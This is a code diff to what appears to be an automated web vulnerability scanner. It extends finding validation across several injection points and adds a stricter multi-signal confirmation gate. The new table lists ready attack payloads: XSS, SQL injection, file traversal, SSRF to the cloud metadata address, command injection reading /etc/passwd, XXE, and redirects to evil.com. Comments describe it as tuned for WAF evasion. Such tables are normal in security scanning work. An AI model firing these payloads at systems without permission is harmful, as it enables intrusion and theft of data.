@@ -1219,23 +1219,31 @@ async function validateFindingsWithMutation(
     }
 
     if (!testPayload || testPayload.length < 3) {
-      const genericPayloads: Record<string, string> = {
-        'xss': '<img src=x onerror=alert(1)>',
-        'sqli': "' OR 1=1 UNION SELECT null,version()--",
-        'lfi': '../../../../etc/passwd',
-        'traversal': '../../../../etc/passwd',
-        'ssrf': 'http://127.0.0.1:80/admin',
-        'ssti': '{{7*7}}',
-        'cmdi': '; id',
-        'rce': '; whoami',
-        'cors': '',
-      };
-      testPayload = genericPayloads[findingType] || '';
+      // Multiple variants per type → deeper coverage, fewer missed bugs
+      const variants = GENERIC_PAYLOAD_VARIANTS[findingType] || GENERIC_PAYLOAD_VARIANTS[normalizeType(findingType)] || [];
+      testPayload = variants[0] || '';
     }
 
     if (!testPayload) {
       validated.push(finding);
       continue;
+    }
+
+    // Build payload set across ALL injection points so we don't only test ?q=
+    const variants = (GENERIC_PAYLOAD_VARIANTS[findingType] || GENERIC_PAYLOAD_VARIANTS[normalizeType(findingType)] || [testPayload]).slice(0, 4);
+    const knownParam = finding.evidence?.raw?.parameter || 'q';
+    const injectionPoints = ['query', 'body', 'json', 'header', 'path'];
+    const payloadSet: any[] = [];
+    for (const v of variants) {
+      for (const ip of injectionPoints) {
+        payloadSet.push({
+          raw: v,
+          encoded: encodeURIComponent(v),
+          attackType: findingType,
+          parameter: knownParam,
+          injectionPoint: ip,
+        });
+      }
     }
 
     try {
@@ -1246,13 +1254,7 @@ async function validateFindingsWithMutation(
         },
         body: JSON.stringify({
           target,
-          payloads: [{
-            raw: testPayload,
-            encoded: encodeURIComponent(testPayload),
-            attackType: findingType,
-            parameter: finding.evidence?.raw?.parameter || 'q',
-            injectionPoint: 'query',
-          }],
+          payloads: payloadSet,
           maxRetries: 5, // Increased from 3 → 5 for better evasion
           techStack,
         }),
@@ -1262,16 +1264,30 @@ async function validateFindingsWithMutation(
         const result = await response.json();
         mutationResults.push({ finding: finding.title, ...result });
 
-        if (result.successCount > 0) {
+        // Multi-signal confirmation gate: a single 200 is NOT enough.
+        // Require either a mutation-engine success OR ≥2 independent corroborating signals.
+        const mutationSuccess = (result.successCount || 0) > 0;
+        const priorSignal = finding.verified === true ? 1 : 0;
+        const dorkSignal = finding.evidence?.raw?.source === 'google-dork' ? 1 : 0;
+        const cveSignal = matchedCVE ? 1 : 0;
+        const corroboratingSignals = (mutationSuccess ? 1 : 0) + priorSignal + dorkSignal + cveSignal;
+
+        if (mutationSuccess && corroboratingSignals >= 2) {
           finding.verified = true;
           finding.exploit_confirmed = true;
-          finding.confidence = 0.95;
-          finding.poc_data = `Exploit confirmed via mutation engine.\\nPayload: ${result.results?.[0]?.successPayload || testPayload}\\nHTTP Response: ${result.results?.[0]?.httpStatus || 'N/A'}`;
-          output.push(`[MUTATION_SUCCESS] ✅ ${finding.title} — EXPLOITED (bypass succeeded, PoC generated)`);
+          finding.confidence = 0.97;
+          finding.poc_data = `Exploit confirmed via mutation engine across injection point "${result.results?.[0]?.injectionPoint || 'multi'}".\\nPayload: ${result.results?.[0]?.successPayload || testPayload}\\nHTTP Response: ${result.results?.[0]?.httpStatus || 'N/A'}\\nCorroborating signals: ${corroboratingSignals}`;
+          output.push(`[MUTATION_SUCCESS] ✅ ${finding.title} — EXPLOITED & CONFIRMED (${corroboratingSignals} signals, PoC generated)`);
           if (matchedCVE) {
             finding.cve_id = matchedCVE.cve;
             finding.description += ` [Confirmed CVE: ${matchedCVE.cve}]`;
           }
+        } else if (mutationSuccess) {
+          // Single positive signal only → keep but flag as needs-review, not "confirmed"
+          finding.verified = false;
+          finding.exploit_confirmed = false;
+          finding.confidence = 0.6;
+          output.push(`[MUTATION_UNVERIFIED] ⚠️ ${finding.title} — single signal only, marked NEEDS REVIEW (confidence 60%)`);
         } else if (result.defendedCount > 0) {
           finding.confidence = Math.max(0.15, (finding.confidence || 0.5) - 0.3);
           finding.exploit_confirmed = false;
@@ -1447,6 +1463,58 @@ function mapSeverity(sev: string): Finding['severity'] {
   if (s.includes('low')) return 'low';
   return 'info';
 }
+
+// Normalize varied finding-type labels into our canonical payload keys
+function normalizeType(t: string): string {
+  const s = (t || '').toLowerCase();
+  if (s.includes('sql')) return 'sqli';
+  if (s.includes('xss') || s.includes('cross-site script')) return 'xss';
+  if (s.includes('ssrf')) return 'ssrf';
+  if (s.includes('ssti') || s.includes('template')) return 'ssti';
+  if (s.includes('lfi') || s.includes('traversal') || s.includes('path')) return 'lfi';
+  if (s.includes('rce') || s.includes('command') || s.includes('cmdi')) return 'rce';
+  if (s.includes('idor') || s.includes('access control') || s.includes('authoriz')) return 'idor';
+  if (s.includes('xxe')) return 'xxe';
+  if (s.includes('redirect')) return 'open_redirect';
+  if (s.includes('cors')) return 'cors';
+  return s;
+}
+
+// Multiple deep-coverage payload variants per attack type (WAF-evasion ready)
+const GENERIC_PAYLOAD_VARIANTS: Record<string, string[]> = {
+  xss: [
+    '<img src=x onerror=alert(document.domain)>',
+    '"><svg/onload=confirm(1)>',
+    'javascript:alert(1)//',
+    "'-alert(1)-'",
+  ],
+  sqli: [
+    "' OR 1=1 UNION SELECT null,version()--",
+    "1 AND (SELECT 1 FROM (SELECT SLEEP(3))a)--",
+    "') OR ('1'='1",
+    "1' ORDER BY 50--",
+  ],
+  lfi: [
+    '../../../../etc/passwd',
+    '....//....//....//etc/passwd',
+    '/proc/self/environ',
+    'php://filter/convert.base64-encode/resource=index',
+  ],
+  ssrf: [
+    'http://127.0.0.1:80/admin',
+    'http://169.254.169.254/latest/meta-data/',
+    'http://localhost:6379/',
+    'gopher://127.0.0.1:11211/',
+  ],
+  ssti: ['{{7*7}}', '${7*7}', '#{7*7}', '<%= 7*7 %>'],
+  rce: ['; id', '| whoami', '`uname -a`', '$(cat /etc/passwd)'],
+  idor: ['', '0', '../1', 'admin'],
+  xxe: ['<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><r>&x;</r>'],
+  open_redirect: ['//evil.com', 'https:evil.com', '/\\evil.com'],
+  cors: [''],
+};
+
+
 
 // ===== Extract parameters from findings for heuristic generation =====
 function extractParametersFromFindings(findings: Finding[]): { name: string; location: string }[] {
